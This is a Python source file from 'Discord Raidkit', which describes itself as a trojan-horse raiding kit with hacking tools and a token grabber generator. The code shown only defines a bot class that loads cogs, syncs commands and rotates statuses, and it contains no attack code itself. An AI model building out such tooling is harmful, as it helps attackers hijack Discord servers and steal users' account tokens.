"""
Discord Raidkit v2.3.1 — "The trojan horse of discord raiding"
Copyright © 2022 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

raidkit.py stores the class responsible for running raidkits.
raidkit.py was last updated on 06/09/22 at 16:52.
"""

import logging
from itertools import cycle

import aiohttp
import discord
from discord.ext import commands, tasks
from discord.errors import NotFound

from display import show_main_raidkit, show_sync_msg

logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
                    filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')


class Raidkit(commands.Bot):
    """A class to handle the running of Raidkits.
    Anubis has a raidkit_id of 1.
    Qetesh has a raidkit_id of 2.
    """

    def __init__(self, raidkit_id: int, prefix: str, app_id: str, theme: str, statuses: list) -> None:
        super().__init__(command_prefix=prefix, intents=discord.Intents.all(),
                         application_id=app_id)
        self.initial_extensions = None
        self.raidkit_id = raidkit_id
        self.session = aiohttp.ClientSession()
        self.theme = theme
        self.prefix = prefix
        self.remove_command('help')
        self.statuses = cycle(statuses)
        return

    async def setup_hook(self) -> None:

        if self.raidkit_id == 1:
            self.initial_extensions = [
                'cogs.anubis.moderation',
                'cogs.anubis.raid_prevention',
                'cogs.anubis.surfing',
                'cogs.anubis.ahelp',
                'cogs.shared.cmds',
                'cogs.shared.handler']
        elif self.raidkit_id == 2:
            self.initial_extensions = [
                'cogs.qetesh.nsfw',
                'cogs.qetesh.qhelp',
                'cogs.shared.cmds',
                'cogs.shared.handler']

        for ext in self.initial_extensions:
            await self.load_extension(ext)

        return

    async def close(self) -> None:
        self.change_status.stop()
        await super().close()
        await self.session.close()
        return

    async def on_ready(self) -> None:
        show_sync_msg(self.theme)
        try:
            await self.tree.sync()
        except NotFound:
            logging.error(
                f'Error in main.py - run_raidkit(): invalid application ID provided.')
            input('\n\nInvalid Application ID Provided\nEnter anything to exit >>> ')
            raise SystemExit
        show_main_raidkit(self.theme, self.prefix)
        self.change_status.start()
        return

    async def on_guild_join(self, guild: discord.Guild) -> None:
        await self.tree.sync(guild=guild)
        return

    @tasks.loop(seconds=10)
    async def change_status(self) -> None:
        await self.change_presence(activity=discord.Game(next(self.statuses)))
